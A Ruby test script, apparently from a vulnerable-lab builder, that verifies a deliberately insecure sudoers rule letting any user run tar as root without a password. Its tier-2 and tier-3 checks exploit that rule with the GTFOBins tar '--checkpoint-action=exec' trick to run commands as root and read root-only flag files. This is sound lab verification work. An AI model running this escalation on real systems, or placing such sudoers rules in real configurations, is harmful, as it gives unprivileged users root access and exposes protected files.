require_relative '../../../../../lib/post_provision_test'


class SudoRootTarTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_tar'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # read_facts: leaked_filenames and strings_to_leak (both checked below)
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_tar", 'root:root 440')
      test_local_command('sudoers rule allows tar as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_tar', 'ALL  ALL=(root) NOPASSWD: /bin/tar *, /usr/bin/tar *')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers configuration is valid', 'visudo -c 2>&1; echo rc=$?', 'rc=0')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      test_local_command('unprivileged user can list the tar sudo rule', 'sudo -n -l', '/usr/bin/tar *', user: 'nobody')
      # the misconfiguration: GTFOBins "tar" sudo technique (checkpoint-action=exec) runs a command as root
      cmd = %q{sudo -n /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id}
      test_local_command('unprivileged user runs a command as root via tar sudo', cmd, 'uid=0(root)', user: 'nobody')
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        read_cmd = "sudo -n /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=#{Shellwords.escape("cat #{Shellwords.escape("/root/#{fname}")}")}"
        test_local_command("unprivileged user reads leaked #{fname} via tar sudo", read_cmd, s.strip.lines.first.to_s.strip, user: 'nobody')
      end
    end
    tier(3) do
      # No Metasploit module exists for this sudo misconfiguration, so prove the
      # privilege escalation directly. with_throwaway_ssh_user creates a fresh,
      # genuinely unprivileged login account (removed again on the way out); from
      # that account the GTFOBins "tar" sudo technique (--checkpoint-action=exec)
      # runs a command as root that drops a sentinel and appends the root-only
      # flag(s). <privilege> is root_rwx, so the sentinel must show a root shell.
      name = 'throwaway user escalates to root via sudo tar (GTFOBins)'
      with_throwaway_ssh_user do |user, _pass|
        foothold = run_as_user(user, 'id')[:stdout].to_s
        if foothold =~ /uid=0\(/
          # Would make "escalation" meaningless; never seen with useradd, but guard it.
          skip_check(name, "throwaway account #{user} is unexpectedly uid 0; cannot prove escalation", tier: 3)
        else
          # The command tar runs as root: build_sentinel writes id + hostname into
          # the sentinel; collect appends each leaked flag so we can confirm the
          # root-only file was readable once escalated.
          collect = leaked.map { |f| "cat #{Shellwords.escape("/root/#{f}")}" }.join('; ')
          sentinel, cmd = build_sentinel(collect.empty? ? nil : collect)
          escalate = 'sudo -n /usr/bin/tar -cf /dev/null /dev/null ' \
                     "--checkpoint=1 --checkpoint-action=exec=#{Shellwords.escape(cmd)}"
          run_as_user(user, escalate)
          body = read_sentinel(sentinel)
          run_vagrant_ssh("rm -f #{Shellwords.escape(sentinel)}") # tidy the sentinel we dropped
          missing = strings.map(&:strip).reject(&:empty?)
                           .reject { |s| body.include?(s.lines.first.to_s.strip) }
          if !sentinel_pwned?(body)
            fail_check(name, "sudo tar as #{user} left no root sentinel (#{sentinel}); escalation not proven", tier: 3,
                       evidence: "foothold id: #{foothold}\nsentinel body: #{body}")
          elsif !privilege_matches?(body, 'root_rwx')
            fail_check(name, "command ran but not as root: #{body[/uid=\S+/]} (module <privilege>=root_rwx)", tier: 3, evidence: body)
          elsif !missing.empty?
            fail_check(name, "escalated to root but the leaked flag was not readable from /root: missing #{missing.inspect}", tier: 3, evidence: body)
          else
            pass_check(name, "#{user} (#{foothold[/uid=\S+/]}) escalated to #{body[/uid=\S+/]} via sudo tar and read the root-only flag", tier: 3)
          end
        end
      end
    end
  end

end

SudoRootTarTest.new.run
